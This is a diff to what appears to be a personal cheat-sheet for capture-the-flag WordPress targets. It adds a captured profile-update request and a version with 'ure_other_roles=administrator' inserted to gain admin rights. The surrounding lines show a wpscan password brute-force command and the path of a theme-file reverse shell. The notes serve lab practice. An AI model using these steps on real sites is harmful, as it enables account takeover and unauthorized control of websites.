@@ -106,6 +106,15 @@ vp = vulnerable plugins
 u = users
 #wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
 
+When wps-user is not admin, there's no plugin and themes editor, Update the profile and capture with burpsuite
+----------------------------------------------------------------------------------------------------------------
+(original)
+_wpnonce=3fdd5d382b&_wp_http_referer=%2Fwp-admin%2Fprofile.php%3Fupdated%3D1&from=profile&checkuser_id=2&color-nonce=f0fc42a21a&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=wendy&display_name=wendy&email=wendy%40tryhackme.com&url=&description=&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile
+
+Insert &ure_other_roles=administrator (behind &pass2=)
+       _____________________________
+_wpnonce=3fdd5d382b&_wp_http_referer=%2Fwp-admin%2Fprofile.php%3Fupdated%3D1&from=profile&checkuser_id=2&color-nonce=f0fc42a21a&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=wendy&display_name=wendy&email=wendy%40tryhackme.com&url=&description=&pass1=&pass2=&ure_other_roles=administrator&action=update&user_id=2&submit=Update+Profile
+
 wps revershell path
 internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 
